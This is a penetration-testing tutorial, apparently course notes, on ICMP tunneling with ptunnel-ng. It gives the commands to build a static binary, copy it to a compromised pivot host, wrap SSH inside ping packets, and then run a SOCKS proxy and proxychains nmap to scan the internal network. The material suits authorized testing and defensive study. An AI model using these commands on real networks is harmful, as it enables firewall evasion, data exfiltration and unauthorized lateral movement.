### **ICMP Tunneling with ptunnel-ng**

**ICMP tunneling** encapsulates traffic within ICMP echo request and response packets. This technique is used to bypass firewalls that block standard TCP/UDP ports but permit **ping responses**. It is effective for data exfiltration and establishing pivot tunnels from a firewalled internal host to an external server.

---

### **1. Setup and Preparation**

If `ptunnel-ng` is not available on the attack host, it must be compiled from source. Building a **static binary** is recommended to ensure the tool runs on the target pivot host without dependency issues.

#### **Building ptunnel-ng**

| Step | Action                         | Command                                                                                                                                                   |
| :--- | :----------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | **Clone** the repository       | `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                       |
| 2    | **Install** build dependencies | `sudo apt install automake autoconf -y`                                                                                                                   |
| 3    | **Modify** for static build    | `cd ptunnel-ng/ && sed -i '$ s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh` |
| 4    | **Compile** the binary         | `sudo ./autogen.sh`                                                                                                                                       |

---

### **2. Operational Workflow**

This workflow establishes a tunnel that encapsulates SSH traffic inside ICMP packets to bypass network restrictions.

1. **Transfer Binary to Pivot**: Move the compiled `ptunnel-ng` directory to the compromised host.
    
    ```
    scp -r ptunnel-ng <USERNAME>@<PIVOT_IP>:~/
    ```
    
2. **Start Server on Pivot**: Initialize the server-side to listen for ICMP packets and forward them to a local service (e.g., SSH on port 22).
    
    ```
    sudo ./ptunnel-ng -r<PIVOT_IP> -R<REMOTE_PORT>
    ```
    
    _Note: The IP following `-r` must be the interface address reachable by the attack host._
3. **Start Client on Attack Host**: Create the local end of the tunnel on the attack machine.
    
    ```
    sudo ./ptunnel-ng -p<PIVOT_IP> -l<LOCAL_PORT> -r<PIVOT_IP> -R<REMOTE_PORT>
    ```
    
4. **Connect via Tunnel**: Use SSH to connect to the local port, which is now being transparently routed through ICMP to the pivot host.
    
    ```
    ssh -p<LOCAL_PORT> -l<USERNAME> 127.0.0.1
    ```
    

---

### **3. Command Reference**

#### **ptunnel-ng Parameters**

|Parameter|Description|
|:--|:--|
|`-p <IP>`|Specifies the IP address of the `ptunnel-ng` server (target pivot).|
|`-l <PORT>`|Specifies the local port on the attack host to listen on.|
|`-r <IP>`|The IP address the `ptunnel-ng` server should accept connections on.|
|`-R <PORT>`|The remote service port to forward traffic to (e.g., 22 for SSH).|

---

### **4. Post-Exploitation & Pivoting**

Once the ICMP tunnel is established, it can be leveraged for deeper network access.

#### **Dynamic Port Forwarding**

To scan or access other hosts in the internal network, establish a **SOCKS proxy** over the existing ICMP tunnel.

```
ssh -D <SOCKS_PORT> -p<LOCAL_PORT> -l<USERNAME> 127.0.0.1
```

#### **Internal Scanning (Proxychains)**

With the SOCKS proxy active, tools like `nmap` can reach the internal subnet through the ICMP tunnel.

```
proxychains nmap -sV -sT <TARGET_IP> -p<PORT>
```

---

### **Attack Implications**

- **Evasion**: Standard traffic (TCP/SSH) is hidden within ICMP packets, making it invisible to simple port-based firewall rules.
- **Persistence**: Provides a stable pivot point for internal discovery and lateral movement.
- **Verification**: Successful tunneling can be confirmed by observing traffic statistics in `ptunnel-ng` logs or using a packet analyzer to see ICMP packets carrying the payload instead of standard TCP/SSH traffic.